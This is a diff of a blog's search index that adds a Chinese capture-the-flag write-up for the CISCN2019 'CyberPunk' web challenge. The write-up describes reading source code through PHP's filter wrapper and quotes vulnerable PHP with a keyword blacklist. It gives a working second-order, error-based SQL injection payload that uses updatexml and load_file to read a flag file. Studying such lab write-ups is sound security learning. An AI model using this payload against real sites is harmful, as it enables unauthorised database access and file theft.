@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk WriteUp</title>
+    <url>/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/</url>
+    <content><![CDATA[<html><head></head><body><h3 id="1-启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能"><a href="#1-启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能" class="headerlink" title="1.  启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能"></a>1.  启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能</h3><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height="400" alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" class="lazyload"></a>
+
+
+<h3 id="2-查看源码发现最底下有个提示，说明可能存在文件包含"><a href="#2-查看源码发现最底下有个提示，说明可能存在文件包含" class="headerlink" title="2. 查看源码发现最底下有个提示，说明可能存在文件包含"></a>2. 查看源码发现最底下有个提示，说明可能存在文件包含</h3><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" class="lazyload"></a>
+
+<h3 id="3-用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞"><a href="#3-用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞" class="headerlink" title="3.  用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞"></a>3.  用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞</h3><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" class="lazyload"></a>
+
+<h3 id="4-发现在confirm-php和change-php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在二次注入。在’old-address’-’”-row-‘address’-”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。"><a href="#4-发现在confirm-php和change-php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在二次注入。在’old-address’-’”-row-‘address’-”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。" class="headerlink" title="4. 发现在confirm.php和change.php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在二次注入。在’old_address’=’”.$row[‘address’].”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。"></a>4. 发现在confirm.php和change.php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在二次注入。在’old_address’=’”.$row[‘address’].”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">{</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span>;</span><br><span class="line">        $fetch = $db->query($sql);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch->num_rows><span class="number">0</span>) {</span><br><span class="line">        $msg = $user_name.<span class="string">"已提交订单"</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db->prepare($sql);</span><br><span class="line">        $re->bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re->execute();</span><br></pre></td></tr></tbody></table></figure></div>
+
+
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line">$sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br></pre></td></tr></tbody></table></figure></div>
+
+
+
+
+<h3 id="5-思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下-报错注入攻击语句"><a href="#5-思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下-报错注入攻击语句" class="headerlink" title="5. 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下 报错注入攻击语句"></a>5. 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下 报错注入攻击语句</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//如果flag太长的话，通过改变<span class="keyword">substr</span>的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></tbody></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+</body></html>]]></content>
+      <tags>
+        <tag>sqli</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Training: MySQL I &amp; Training: MySQL II</title>
     <url>/2019/12/29/Training-MySQL-I-Training-MySQL-II/</url>
     <content><![CDATA[<html><head></head><body><h1 id="0x01-Training-MySQL-I"><a href="#0x01-Training-MySQL-I" class="headerlink" title="0x01 Training: MySQL I"></a>0x01 Training: MySQL I</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;<span class="comment">#关键代码</span></span><br></pre></td></tr></tbody></table></figure></div>
